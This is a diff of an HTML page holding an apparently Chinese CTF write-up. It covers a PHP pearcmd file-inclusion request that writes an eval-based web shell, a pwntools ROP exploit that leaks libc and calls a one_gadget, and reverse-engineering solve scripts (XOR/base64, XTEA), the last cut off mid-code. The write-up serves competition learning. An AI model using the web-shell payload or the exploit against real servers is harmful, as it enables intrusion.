@@ -136,70 +136,70 @@
     <h2 id="web">Web</h2>
 <h3 id="include">include</h3>
 <p>p牛的PHP裸文件本地包含</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>/index.php?+config-create+/&amp;file=../../../../usr/local/lib/php/pearcmd&amp;/&lt;? eval($_POST[1]);?&gt;+/tmp/hello.php
-</span></span></code></pre></div><h2 id="pwn">Pwn</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">/index.php?+config-create+/&amp;file=../../../../usr/local/lib/php/pearcmd&amp;/&lt;? eval($_POST[1]);?&gt;+/tmp/hello.php
+</code></pre></div><h2 id="pwn">Pwn</h2>
 <h3 id="very_old_school">very_old_school</h3>
 <p>神奇的gadget，老题，改read的got为write泄露地址，最后onegadget即可。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
-</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
-</span></span><span style="display:flex;"><span>    debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>    debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> debug:
-</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./very_old_school&#34;</span>)
-</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc-2.27.so&#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;39.104.61.18&#34;</span>, <span style="color:#ae81ff">5656</span>)
-</span></span><span style="display:flex;"><span>    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.27.so&#39;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./very_old_school&#39;</span>)
-</span></span><span style="display:flex;"><span>ru <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recvuntil(x)
-</span></span><span style="display:flex;"><span>sn <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>send(x)
-</span></span><span style="display:flex;"><span>rl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> : p<span style="color:#f92672">.</span>recvline()
-</span></span><span style="display:flex;"><span>sl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>sendline(x)
-</span></span><span style="display:flex;"><span>rv <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recv(x)
-</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendafter(a,b)
-</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendlineafter(a, b)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>pop_all <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4005da</span> 
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x40</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xaaaaaaaa</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_all)
-</span></span><span style="display:flex;"><span>diff <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;write&#39;</span>] <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;read&#39;</span>]
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(p)</span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># sleep(1)</span>
-</span></span><span style="display:flex;"><span>print(diff <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffffffffffff</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(diff <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffffffffffff</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x601020</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3d</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400518</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00000000004005e3</span>) 
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>) 
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00000000004005e1</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;read&#39;</span>])
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) 
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;read&#39;</span>])
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(pop_all)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64((<span style="color:#f92672">-</span>diff) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffffffffffff</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0601020</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3d</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400518</span>) 
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x400450</span>) 
-</span></span><span style="display:flex;"><span>print(hex(len(payload)))
-</span></span><span style="display:flex;"><span>sn(payload)
-</span></span><span style="display:flex;"><span>write <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
-</span></span><span style="display:flex;"><span>libc_addr <span style="color:#f92672">=</span> write <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;write&#39;</span>]
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(hex(libc_addr))
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x40</span>
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xaaaaaaaa</span>)
-</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(libc_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10a41c</span>)
-</span></span><span style="display:flex;"><span>sn(payload)
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
-</span></span></code></pre></div><h2 id="rev">Rev</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> sys
+context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;amd64&#39;</span>, log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>)
+
+<span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>:
+    debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+<span style="color:#66d9ef">else</span>:
+    debug <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+
+<span style="color:#66d9ef">if</span> debug:
+    p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./very_old_school&#34;</span>)
+    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc-2.27.so&#34;</span>)
+<span style="color:#66d9ef">else</span>:
+    p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;39.104.61.18&#34;</span>, <span style="color:#ae81ff">5656</span>)
+    libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./libc-2.27.so&#39;</span>)
+
+elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./very_old_school&#39;</span>)
+ru <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recvuntil(x)
+sn <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>send(x)
+rl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> : p<span style="color:#f92672">.</span>recvline()
+sl <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>sendline(x)
+rv <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recv(x)
+sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendafter(a,b)
+sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> a,b : p<span style="color:#f92672">.</span>sendlineafter(a, b)
+
+pop_all <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4005da</span> 
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x40</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xaaaaaaaa</span>)
+payload <span style="color:#f92672">+=</span> p64(pop_all)
+diff <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;write&#39;</span>] <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;read&#39;</span>]
+<span style="color:#75715e"># gdb.attach(p)</span>
+<span style="color:#75715e"># sleep(1)</span>
+print(diff <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffffffffffff</span>)
+payload <span style="color:#f92672">+=</span> p64(diff <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffffffffffff</span>)
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x601020</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3d</span>)
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400518</span>)
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00000000004005e3</span>) 
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">1</span>) 
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x00000000004005e1</span>)
+payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;read&#39;</span>])
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0</span>) 
+payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;read&#39;</span>])
+payload <span style="color:#f92672">+=</span> p64(pop_all)
+payload <span style="color:#f92672">+=</span> p64((<span style="color:#f92672">-</span>diff) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffffffffffffffff</span>)
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0601020</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x3d</span>)
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">4</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x0000000000400518</span>) 
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x400450</span>) 
+print(hex(len(payload)))
+sn(payload)
+write <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)
+libc_addr <span style="color:#f92672">=</span> write <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;write&#39;</span>]
+log<span style="color:#f92672">.</span>info(hex(libc_addr))
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x40</span>
+payload <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0xaaaaaaaa</span>)
+payload <span style="color:#f92672">+=</span> p64(libc_addr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10a41c</span>)
+sn(payload)
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="rev">Rev</h2>
 <h3 id="jsuck">jsuck</h3>
 <p>js混淆</p>
 <p>先对flag进行base64编码</p>
@@ -208,20 +208,20 @@
 <p>wrwg()函数将数组转回字符串</p>
 <p>最后与已知字符串进行比较</p>
 <p>求解脚本：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
-</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Yn{kY0wjNGJ1NyJ3ZyZ6NGQjNnF6Z1J3Zid7YGYhMiEiLGEhN[3&gt;&#34;</span>
-</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> a:
-</span></span><span style="display:flex;"><span>    flag <span style="color:#f92672">+=</span> chr(i <span style="color:#f92672">^</span> <span style="color:#ae81ff">3</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>print (base64<span style="color:#f92672">.</span>b64decode(flag))
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># b&#39;flag{b026324c6904b2a9cb4b88d6d61c81d1}&#39;</span>
-</span></span></code></pre></div><h3 id="rtmaze">rtMaze</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> base64
+a <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Yn{kY0wjNGJ1NyJ3ZyZ6NGQjNnF6Z1J3Zid7YGYhMiEiLGEhN[3&gt;&#34;</span>
+flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> a:
+    flag <span style="color:#f92672">+=</span> chr(i <span style="color:#f92672">^</span> <span style="color:#ae81ff">3</span>)
+
+print (base64<span style="color:#f92672">.</span>b64decode(flag))
+<span style="color:#75715e"># b&#39;flag{b026324c6904b2a9cb4b88d6d61c81d1}&#39;</span>
+</code></pre></div><h3 id="rtmaze">rtMaze</h3>
 <p>qemu，使用gdb调试，确认基地址为0x60010000，设置后ida可反编译</p>
 <p>根据字符串找到核心逻辑在0x600117b0，传入的参数为此前迷宫中的输入内容</p>
 <p>由于对其填充到了48个字符，猜测该迷宫需要反向跑：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>dddwwawwwwaasdsasawawdwaaasawassssdwdsddssasddw
-</span></span></code></pre></div><p>加密部分如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">dddwwawwwwaasdsasawawdwaaasawassssdwdsddssasddw
+</code></pre></div><p>加密部分如下</p>
 <p><figure 
 	
 		class="gallery-image" 
@@ -259,139 +259,139 @@
 </figure></p>
 <p>将迷宫输入分为12个int，每次循环选取4个int作为key，进行XTEA加密</p>
 <p>解密脚本：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;  </span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;  </span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">decipher</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> num_rounds, <span style="color:#66d9ef">uint32_t</span> v[<span style="color:#ae81ff">2</span>], <span style="color:#66d9ef">uint32_t</span> <span style="color:#66d9ef">const</span> key[<span style="color:#ae81ff">4</span>]) {  
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i;  
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> v0<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">0</span>], v1<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">1</span>], delta<span style="color:#f92672">=</span><span style="color:#ae81ff">0x9E3779B9</span>, sum<span style="color:#f92672">=</span>delta<span style="color:#f92672">*</span>num_rounds;  
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> num_rounds; i<span style="color:#f92672">++</span>) {  
-</span></span><span style="display:flex;"><span>        v1 <span style="color:#f92672">-=</span> (((v0 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v0) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[(sum<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">11</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);  
-</span></span><span style="display:flex;"><span>        sum <span style="color:#f92672">-=</span> delta;  
-</span></span><span style="display:flex;"><span>        v0 <span style="color:#f92672">-=</span> (((v1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v1) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[sum <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);  
-</span></span><span style="display:flex;"><span>    }  
-</span></span><span style="display:flex;"><span>    v[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>v0; v[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>v1;  
-</span></span><span style="display:flex;"><span>}  
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()  
-</span></span><span style="display:flex;"><span>{  
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> v[<span style="color:#ae81ff">10</span>]<span style="color:#f92672">=</span>{
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x9C51DE69</span>, <span style="color:#ae81ff">0xD8C793BF</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x6346ACA4</span>, 
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xF8D452EA</span>, 
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xA54B10D5</span>, 
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x2F8D8FC6</span>, 
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0xC702BB4D</span>, 
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x4725858D</span>, 
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x2B0AA099</span>, 
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x1601D0A6</span>, 
-</span></span><span style="display:flex;"><span>        };  
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> <span style="color:#66d9ef">const</span> k[<span style="color:#ae81ff">12</span>]<span style="color:#f92672">=</span>{
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x77646464</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x77776177</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x61617777</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x61736473</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x61776173</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x61776477</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x61736161</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x73736177</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x77647373</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x64647364</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x73617373</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0x61776464</span>
-</span></span><span style="display:flex;"><span>    };
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> r<span style="color:#f92672">=</span><span style="color:#ae81ff">32</span>;
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;加密后的数据：%u %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v[<span style="color:#ae81ff">0</span>],v[<span style="color:#ae81ff">1</span>]);  
-</span></span><span style="display:flex;"><span>    decipher(r, v, k);  
-</span></span><span style="display:flex;"><span>    decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, k <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);  
-</span></span><span style="display:flex;"><span>    decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, k <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>);  
-</span></span><span style="display:flex;"><span>    decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>, k);  
-</span></span><span style="display:flex;"><span>    decipher(r, v <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, k <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">40</span>; i<span style="color:#f92672">++</span>)
-</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;%c&#34;</span>, <span style="color:#f92672">*</span>(((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)v) <span style="color:#f92672">+</span> i));
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;  
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#75715e">// d8550a7b7-d0a0d-4f37-b4abc0-0cf93eb3dfd4
-</span></span></span></code></pre></div><h2 id="crypto">Crypto</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;  </span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;  </span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>  
+<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">decipher</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> num_rounds, <span style="color:#66d9ef">uint32_t</span> v[<span style="color:#ae81ff">2</span>], <span style="color:#66d9ef">uint32_t</span> <span style="color:#66d9ef">const</span> key[<span style="color:#ae81ff">4</span>]) {  
+    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i;  
+    <span style="color:#66d9ef">uint32_t</span> v0<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">0</span>], v1<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">1</span>], delta<span style="color:#f92672">=</span><span style="color:#ae81ff">0x9E3779B9</span>, sum<span style="color:#f92672">=</span>delta<span style="color:#f92672">*</span>num_rounds;  
+    <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> num_rounds; i<span style="color:#f92672">++</span>) {  
+        v1 <span style="color:#f92672">-=</span> (((v0 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>)) <span style="color:#f92672">+</span> v0) <span style="color:#f92672">^</span> (sum <span style="color:#f92672">+</span> key[(sum<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">11</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">3</span>]);  
+        sum <span style="color:#f92672">-=</span> delta;  
